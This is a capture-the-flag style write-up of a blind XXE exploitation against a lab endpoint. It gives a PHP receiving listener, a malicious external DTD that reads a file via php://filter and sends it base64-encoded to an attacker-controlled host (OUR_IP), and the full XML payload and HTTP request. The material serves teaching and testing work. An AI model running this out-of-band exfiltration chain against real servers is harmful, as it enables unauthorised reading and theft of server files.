# 🕳️ Blind XXE Data Exfiltration
## 🎯 Objective
Exploit a blind XXE vulnerability on the /blind endpoint to read the contents of the file /327a6c4304ad5938eaf0efb6cc3e53dc.php and extract the flag using Out-of-Band (OOB) exfiltration via HTTP.
## 🧠 Attack Overview
Since this is a blind vulnerability:
- The server does not reflect the content of parsed XML entities.
- No PHP errors or direct feedback is shown.
To bypass this, I leveraged an external DTD that:
- Reads the file content using a PHP filter.
- Encodes it in base64.
- Sends it back to my HTTP listener as part of a query parameter.

## 🛠 Setup – Listener for OOB Exfiltration
First, I created a simple PHP script (`index.php`) that receives the base64 string and decodes it:
```bash
<?php
if (isset($_GET['content'])) {
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
I launched a local web server to serve the malicious DTD and receive the incoming request:
```bash
php -S 0.0.0.0:8000
```
## 📦 Malicious DTD File (xxe.dtd)
This DTD was hosted on my machine and instructs the target to:
- Read the file using php://filter with base64 encoding.
- Send the encoded content to my server via HTTP:
```bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
_(Note: `OUR_IP` is replaced with my tun0 IP.)_

## 📤 Exploit Payload (XML)
The final malicious XML that I submitted to `/blind/submitDetails.php` was:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
![image](https://github.com/user-attachments/assets/e88fc120-ab75-4586-8a96-9cdb5db3f478)

## 📬 Sending the Exploit
I sent the XML payload using Burp Suite or curl:
```bash
POST /blind/submitDetails.php HTTP/1.1
Host: TARGET_IP
Content-Type: application/xml
Content-Length: [length]

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
## 📥 Retrieving the Flag
My HTTP listener received the base64-encoded content as:

/?content=PD9waHAgZmxhZyA9ICJ7RkxBR30iOyBlY2hvICRmbGFnIDs/Pg==

![image](https://github.com/user-attachments/assets/9a99003e-9ca0-4140-bc0b-957f0fab4bc6)

## ✅ Conclusion
This exercise demonstrated a fully blind XXE exploitation using an Out-of-Band HTTP-based exfiltration technique. Even when the application does not reflect any response, it is possible to exfiltrate sensitive data via DNS or HTTP channels with proper entity chaining and external DTD references.
